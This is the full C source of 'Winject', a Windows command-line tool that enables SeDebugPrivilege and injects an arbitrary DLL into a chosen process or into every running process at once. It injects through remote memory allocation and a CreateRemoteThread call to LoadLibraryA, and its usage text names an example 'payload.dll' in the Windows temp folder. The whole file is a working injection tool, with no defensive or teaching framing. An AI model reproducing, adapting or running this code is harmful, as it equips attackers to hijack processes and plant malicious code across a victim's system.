#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// ─── Privilege ───────────────────────────────────────────────────────────────

BOOL EnableDebugPrivilege() {
    HANDLE token;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
        &token)) {
        printf("[-] OpenProcessToken failed: %lu\n", GetLastError());
        return FALSE;
    }

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        printf("[-] LookupPrivilegeValue failed: %lu\n", GetLastError());
        CloseHandle(token);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(token, FALSE, &tp,
        sizeof(TOKEN_PRIVILEGES),
        NULL, NULL)) {
        printf("[-] AdjustTokenPrivileges failed: %lu\n", GetLastError());
        CloseHandle(token);
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        printf("[-] SeDebugPrivilege not present in token\n");
        CloseHandle(token);
        return FALSE;
    }

    CloseHandle(token);
    return TRUE;
}

// ─── Injection Task (per thread) ─────────────────────────────────────────────

typedef struct {
    DWORD   pid;
    wchar_t name[MAX_PATH];
    char    dllPath[MAX_PATH];
} INJECT_TASK;

DWORD WINAPI InjectionThread(LPVOID lpParam) {
    INJECT_TASK* task = (INJECT_TASK*)lpParam;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, task->pid);
    if (!hProcess) {
        printf("[-] %-8lu %-40ls FAILED  (GLE=%lu)\n",
            task->pid, task->name, GetLastError());
        free(task);
        return 1;
    }

    printf("[+] %-8lu %-40ls OPENED\n", task->pid, task->name);

    size_t pathLen = strlen(task->dllPath) + 1;
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, pathLen,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);
    if (!remoteMem) {
        printf("    [-] %ls VirtualAllocEx failed: %lu\n",
            task->name, GetLastError());
        CloseHandle(hProcess);
        free(task);
        return 1;
    }

    if (!WriteProcessMemory(hProcess, remoteMem,
        task->dllPath, pathLen, NULL)) {
        printf("    [-] %ls WriteProcessMemory failed: %lu\n",
            task->name, GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        free(task);
        return 1;
    }

    LPVOID loadLibAddr = (LPVOID)GetProcAddress(
        GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (!loadLibAddr) {
        printf("    [-] %ls GetProcAddress failed: %lu\n",
            task->name, GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        free(task);
        return 1;
    }

    HANDLE hThread = CreateRemoteThread(
        hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)loadLibAddr,
        remoteMem, 0, NULL);
    if (!hThread) {
        printf("    [-] %ls CreateRemoteThread failed: %lu\n",
            task->name, GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        free(task);
        return 1;
    }

    WaitForSingleObject(hThread, 3000);

    DWORD exitCode = 0;
    GetExitCodeThread(hThread, &exitCode);
    if (exitCode == 0)
        printf("    [-] %ls LoadLibraryA returned NULL\n", task->name);
    else
        printf("    [+] %ls injected OK\n", task->name);

    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    free(task);
    return 0;
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

void GetProcessName(DWORD pid, wchar_t* outName, size_t outLen) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        wcscpy_s(outName, outLen, L"<unknown>");
        return;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    wcscpy_s(outName, outLen, L"<unknown>");

    if (Process32First(snapshot, &pe)) {
        do {
            if (pe.th32ProcessID == pid) {
                wcscpy_s(outName, outLen, pe.szExeFile);
                break;
            }
        } while (Process32Next(snapshot, &pe));
    }

    CloseHandle(snapshot);
}

HANDLE SpawnInjectionThread(DWORD pid, const wchar_t* name,
    const char* dllPath) {
    INJECT_TASK* task = (INJECT_TASK*)malloc(sizeof(INJECT_TASK));
    if (!task) return NULL;

    task->pid = pid;

    // safe copies — always null terminate, abort on overflow
    wcscpy_s(task->name, MAX_PATH, name);
    strcpy_s(task->dllPath, MAX_PATH, dllPath);

    HANDLE hThread = CreateThread(NULL, 0, InjectionThread, task, 0, NULL);
    if (!hThread) free(task);
    return hThread;
}

// ─── Single PID inject ────────────────────────────────────────────────────────

void InjectSinglePID(DWORD pid, const char* dllPath) {
    printf("[*] Targeting single PID: %lu\n", pid);

    wchar_t name[MAX_PATH];
    GetProcessName(pid, name, MAX_PATH);

    printf("\n%-8s %-40s %s\n", "PID", "Name", "Status");
    printf("%-8s %-40s %s\n", "---", "----", "------");

    HANDLE hThread = SpawnInjectionThread(pid, name, dllPath);
    if (!hThread) {
        printf("[-] Failed to create injection thread\n");
        return;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
}

// ─── Systemwide parallel inject ───────────────────────────────────────────────

#define MAX_PROCESSES 512

void InjectAllProcesses(const char* dllPath) {
    printf("[*] Targeting all processes (systemwide)\n");

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("[-] CreateToolhelp32Snapshot failed: %lu\n", GetLastError());
        return;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    HANDLE threads[MAX_PROCESSES];
    int    threadCount = 0;

    printf("\n%-8s %-40s %s\n", "PID", "Name", "Status");
    printf("%-8s %-40s %s\n", "---", "----", "------");

    if (Process32First(snapshot, &pe)) {
        do {
            if (threadCount >= MAX_PROCESSES) break;

            HANDLE hThread = SpawnInjectionThread(
                pe.th32ProcessID, pe.szExeFile, dllPath);

            if (hThread)
                threads[threadCount++] = hThread;

        } while (Process32Next(snapshot, &pe));
    }

    CloseHandle(snapshot);

    printf("\n[*] Spawned %d injection threads, waiting...\n", threadCount);

    int i = 0;
    while (i < threadCount) {
        int batch = threadCount - i;
        if (batch > MAXIMUM_WAIT_OBJECTS)
            batch = MAXIMUM_WAIT_OBJECTS;

        WaitForMultipleObjects(batch, &threads[i], TRUE, INFINITE);

        for (int j = i; j < i + batch; j++)
            CloseHandle(threads[j]);

        i += batch;
    }

    printf("[*] All injection threads finished\n");
}

// ─── Entry Point ─────────────────────────────────────────────────────────────

void PrintUsage() {
    printf("Usage:\n");
    printf("  Winject.exe <dll>             -- inject into all processes\n");
    printf("  Winject.exe <dll> -pid <PID>  -- inject into specific PID\n");
    printf("\nExamples:\n");
    printf("  Winject.exe C:\\Windows\\Temp\\payload.dll\n");
    printf("  Winject.exe C:\\Windows\\Temp\\payload.dll -pid 1234\n");
}

int main(int argc, char* argv[]) {
    printf("Winject\n");
    printf("-------\n");

    if (argc < 2) {
        PrintUsage();
        return 1;
    }

    const char* dllPath = argv[1];
    DWORD       targetPid = 0;
    BOOL        singleMode = FALSE;

    for (int i = 2; i < argc; i++) {
        if (_stricmp(argv[i], "-pid") == 0) {
            if (i + 1 >= argc) {
                printf("[-] -pid requires a value\n");
                PrintUsage();
                return 1;
            }
            targetPid = (DWORD)atoi(argv[i + 1]);
            singleMode = TRUE;
            i++;
        }
    }

    printf("[*] DLL path: %s\n", dllPath);

    if (singleMode)
        printf("[*] Mode: single PID (%lu)\n", targetPid);
    else
        printf("[*] Mode: systemwide\n");

    printf("[*] Enabling SeDebugPrivilege...\n");

    if (!EnableDebugPrivilege()) {
        printf("[-] Failed -- run as admin or SYSTEM\n");
        return 1;
    }

    printf("[+] SeDebugPrivilege enabled\n\n");

    if (singleMode)
        InjectSinglePID(targetPid, dllPath);
    else
        InjectAllProcesses(dllPath);

    return 0;
}
